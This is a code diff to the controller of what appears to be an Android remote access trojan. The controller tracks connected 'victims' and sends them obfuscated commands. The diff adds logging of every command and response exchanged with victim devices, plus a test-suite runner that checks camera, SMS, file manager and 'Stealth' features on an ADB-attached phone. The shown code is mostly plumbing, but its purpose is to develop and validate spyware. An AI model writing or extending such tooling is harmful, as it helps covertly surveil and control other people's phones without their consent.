@@ -465,6 +465,61 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
       //notify renderer proccess (AppCtrl) about the new Victim
       win.webContents.send('SocketIO:NewVictim', index);
 
+      // Helper function to send logs to GUI
+      const sendLogToGUI = (type, event, data) => {
+        if (win && win.webContents) {
+          try {
+            let dataStr = '';
+            if (data) {
+              if (typeof data === 'string') {
+                dataStr = data;
+              } else {
+                try {
+                  dataStr = JSON.stringify(data, null, 2);
+                } catch (e) {
+                  dataStr = String(data);
+                }
+              }
+            }
+            // Truncate very long data
+            if (dataStr.length > 5000) {
+              dataStr = dataStr.substring(0, 5000) + '...[truncated]';
+            }
+            win.webContents.send(`log:${type}`, {
+              deviceId: index,
+              command: event,
+              data: dataStr
+            });
+          } catch (e) {
+            // Ignore serialization errors
+          }
+        }
+      };
+
+      // Wrap socket.emit to log all requests
+      const originalEmit = socket.emit.bind(socket);
+      socket.emit = function(event, data) {
+        log.request(index, event, data);
+        sendLogToGUI('request', event, data);
+        return originalEmit(event, data);
+      };
+      
+      // Wrap socket.on to log all responses
+      // We need to wrap handlers as they're registered
+      const originalOn = socket.on.bind(socket);
+      socket.on = function(event, callback) {
+        // Wrap the callback to log responses
+        const wrappedCallback = function(data) {
+          log.response(index, event, data);
+          sendLogToGUI('response', event, data);
+          // Call original callback
+          if (callback && typeof callback === 'function') {
+            return callback(data);
+          }
+        };
+        return originalOn(event, wrappedCallback);
+      };
+
       // Handle battery updates from client
       socket.on('x0000bt', function(data) {
         try {
@@ -649,6 +704,14 @@ ipcMain.on('openLabWindow', function (e, page, index) {
   const originalEmit = originalSocket.emit.bind(originalSocket);
   originalSocket.emit = function(event, data) {
     log.request(victimId, event, data);
+    // Send to renderer for GUI display
+    if (win && win.webContents) {
+      win.webContents.send('log:request', {
+        deviceId: victimId,
+        command: event,
+        data: data
+      });
+    }
     return originalEmit(event, data);
   };
   
@@ -657,6 +720,14 @@ ipcMain.on('openLabWindow', function (e, page, index) {
   originalSocket.on = function(event, callback) {
     return originalOn(event, function(data) {
       log.response(victimId, event, data);
+      // Send to renderer for GUI display
+      if (win && win.webContents) {
+        win.webContents.send('log:response', {
+          deviceId: victimId,
+          command: event,
+          data: data
+        });
+      }
       callback(data);
     });
   };
@@ -696,4 +767,178 @@ ipcMain.on('openLabWindow', function (e, page, index) {
       log.info('All socket listeners removed');
     }
   })
+});
+
+// ========== TEST SUITE IPC HANDLERS ==========
+let testSuiteProcess = null;
+
+ipcMain.on('test-suite:start', (event, config) => {
+  log.info('Starting test suite with config:', JSON.stringify(config));
+  
+  if (testSuiteProcess) {
+    log.warn('Test suite already running');
+    event.reply('test-suite:error', { message: 'Test suite is already running' });
+    return;
+  }
+  
+  try {
+    const testSuitePath = path.join(__dirname, '..', '..', 'test-comprehensive-suite.js');
+    const args = [];
+    
+    // Add device ID if specified
+    if (config.deviceId) {
+      // Set environment variable for device selection
+      process.env.ADB_DEVICE = config.deviceId;
+    }
+    
+    // Add server IP and port
+    if (config.serverIP) {
+      process.env.SERVER_IP = config.serverIP;
+    }
+    if (config.port) {
+      process.env.PORT = config.port.toString();
+    }
+    
+    // Add flags
+    if (config.onlyFailing) {
+      args.push('--only-failing');
+    }
+    if (!config.autoBuild) {
+      process.env.AUTO_BUILD = 'false';
+    }
+    if (!config.forceRebuild) {
+      process.env.FORCE_REBUILD = 'false';
+    }
+    
+    // Spawn the test suite process
+    const { spawn } = require('child_process');
+    const isWindows = process.platform === 'win32';
+    const nodeCmd = isWindows ? 'node' : 'node';
+    
+    testSuiteProcess = spawn(nodeCmd, [testSuitePath, ...args], {
+      cwd: path.join(__dirname, '..', '..'),
+      env: { ...process.env },
+      shell: isWindows
+    });
+    
+    // Buffer for multi-line output
+    let outputBuffer = '';
+    
+    // Send output to renderer
+    testSuiteProcess.stdout.on('data', (data) => {
+      outputBuffer += data.toString();
+      const lines = outputBuffer.split('\n');
+      outputBuffer = lines.pop() || ''; // Keep incomplete line in buffer
+      
+      for (const line of lines) {
+        if (!line.trim()) continue;
+        
+        let type = 'info';
+        if (line.includes('PASSED') || line.includes('✓') || line.includes('Ôťô')) type = 'success';
+        else if (line.includes('FAILED') || line.includes('✗') || line.includes('ÔťŚ')) type = 'error';
+        else if (line.includes('WARN') || line.includes('Warning')) type = 'warn';
+        else if (line.includes('Building') || line.includes('Installing')) type = 'info';
+        else if (line.includes('TEST') || line.includes('STATISTICS')) type = 'info';
+        
+        event.reply('test-suite:output', { message: line, type });
+        
+        // Parse test results - improved pattern matching
+        const testResultMatch = line.match(/\[TEST\s+(\d+)\/(\d+)\]\s+(.+?)(?:\s+-\s+(PASSED|FAILED))?/);
+        if (testResultMatch) {
+          const testName = testResultMatch[3].trim();
+          const status = testResultMatch[4] || (line.includes('PASSED') || line.includes('✓') || line.includes('Ôťô') ? 'PASSED' : 
+                        (line.includes('FAILED') || line.includes('✗') || line.includes('ÔťŚ') ? 'FAILED' : null));
+          
+          if (status) {
+            const timeMatch = line.match(/(\d+(?:\.\d+)?)\s*(ms|s)/);
+            const time = timeMatch ? parseFloat(timeMatch[1]) * (timeMatch[2] === 's' ? 1000 : 1) : 0;
+            const errorMatch = line.match(/Error Reason:\s*(.+?)(?:\s*$|,)/);
+            
+            event.reply('test-suite:result', {
+              name: testName,
+              category: extractCategory(testName),
+              success: status === 'PASSED',
+              time: time,
+              error: status === 'FAILED' ? (errorMatch ? errorMatch[1] : 'Test failed') : null
+            });
+          }
+        }
+        
+        // Parse statistics
+        const statsMatch = line.match(/Total Tests:\s*(\d+).*?Passed:\s*(\d+).*?Failed:\s*(\d+)/);
+        if (statsMatch) {
+          const stats = {
+            total: parseInt(statsMatch[1]),
+            passed: parseInt(statsMatch[2]),
+            failed: parseInt(statsMatch[3])
+          };
+          event.reply('test-suite:stats', stats);
+        }
+      }
+    });
+    
+    // Helper function to extract category from test name
+    function extractCategory(testName) {
+      if (testName.includes('Camera')) return 'Camera';
+      if (testName.includes('File Manager')) return 'File Manager';
+      if (testName.includes('SMS')) return 'SMS';
+      if (testName.includes('Stealth')) return 'Stealth';
+      if (testName.includes('Wake')) return 'System';
+      return 'Other';
+    }
+    
+    testSuiteProcess.stderr.on('data', (data) => {
+      event.reply('test-suite:output', { message: data.toString(), type: 'error' });
+    });
+    
+    testSuiteProcess.on('close', (code) => {
+      log.info(`Test suite process exited with code ${code}`);
+      
+      // Process any remaining buffer
+      if (outputBuffer.trim()) {
+        const lines = outputBuffer.split('\n').filter(l => l.trim());
+        for (const line of lines) {
+          event.reply('test-suite:output', { message: line, type: 'info' });
+        }
+      }
+      
+      // Default stats (will be updated by stats event if parsed)
+      const stats = {
+        total: 0,
+        passed: 0,
+        failed: 0
+      };
+      
+      event.reply('test-suite:complete', stats);
+      testSuiteProcess = null;
+    });
+    
+    // Listen for stats updates
+    const statsListener = (event, stats) => {
+      // Update final stats when received
+      if (stats && stats.total > 0) {
+        // Stats will be sent via separate event
+      }
+    };
+    
+    testSuiteProcess.on('error', (error) => {
+      log.error('Test suite process error:', error);
+      event.reply('test-suite:error', { message: error.message });
+      testSuiteProcess = null;
+    });
+    
+  } catch (error) {
+    log.error('Error starting test suite:', error);
+    event.reply('test-suite:error', { message: error.message });
+    testSuiteProcess = null;
+  }
+});
+
+ipcMain.on('test-suite:stop', (event) => {
+  log.info('Stopping test suite');
+  if (testSuiteProcess) {
+    testSuiteProcess.kill();
+    testSuiteProcess = null;
+    event.reply('test-suite:output', { message: 'Test suite stopped', type: 'warn' });
+  }
 });
